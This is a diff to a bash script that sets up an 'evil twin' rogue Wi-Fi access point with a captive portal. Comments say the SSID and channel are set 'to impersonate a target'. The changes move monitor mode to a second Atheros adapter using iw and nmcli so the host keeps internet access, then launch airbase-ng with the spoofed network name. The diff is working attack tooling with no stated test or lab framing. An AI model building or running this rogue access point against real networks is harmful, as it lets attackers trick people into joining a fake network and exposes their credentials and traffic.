@@ -9,8 +9,8 @@ set -euo pipefail
 
 SSID="${ET_SSID:-HackTech-Free-WiFi}"       # panel/ops sets ET_SSID to impersonate a target
 CHANNEL="${ET_CHANNEL:-6}"                   # panel/ops sets ET_CHANNEL to match its channel
-IFACE="wlan0"
-MONIFACE="wlan0mon"
+IFACE="${ET_IFACE:-wlan1}"                   # AR9271 (ath9k_htc); wlan0 here is the Intel net card — leave it online
+MONIFACE="$IFACE"                            # NM-safe monitor keeps the same name
 AT0_IP="10.0.0.1/24"
 DNSMASQ_CONF="/etc/dnsmasq-portal.conf"
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -33,18 +33,20 @@ if ! lsusb | grep -qiE 'atheros|ar9271'; then
 fi
 echo "  OK: adapter present."
 
-echo "[2/7] Killing interfering processes..."
-airmon-ng check kill >/dev/null 2>&1 || true
+echo "[2/7] Releasing $IFACE from NetworkManager (other adapters stay online)..."
+# Only this adapter is released — no 'airmon-ng check kill', so wlan0's internet survives.
+nmcli device set "$IFACE" managed no 2>/dev/null || true
 
 echo "[3/7] Enabling monitor mode on $IFACE..."
-if ! iwconfig "$MONIFACE" >/dev/null 2>&1; then
-  airmon-ng start "$IFACE" >/dev/null 2>&1
-fi
-if ! iwconfig "$MONIFACE" >/dev/null 2>&1; then
-  echo "  ERROR: $MONIFACE did not come up. Check 'iwconfig' manually."
+ip link set "$IFACE" down
+iw dev "$IFACE" set type monitor
+ip link set "$IFACE" up
+iw dev "$IFACE" set channel "$CHANNEL"
+if ! iw dev "$IFACE" info 2>/dev/null | grep -q 'type monitor'; then
+  echo "  ERROR: $IFACE did not enter monitor mode. Check 'iw dev'."
   exit 1
 fi
-echo "  OK: $MONIFACE is in monitor mode."
+echo "  OK: $IFACE is in monitor mode on channel $CHANNEL."
 
 echo "[4/7] Starting airbase-ng (SSID=$SSID, channel=$CHANNEL) in background..."
 nohup airbase-ng -e "$SSID" -c "$CHANNEL" "$MONIFACE" > "$LOG_DIR/airbase.log" 2>&1 &
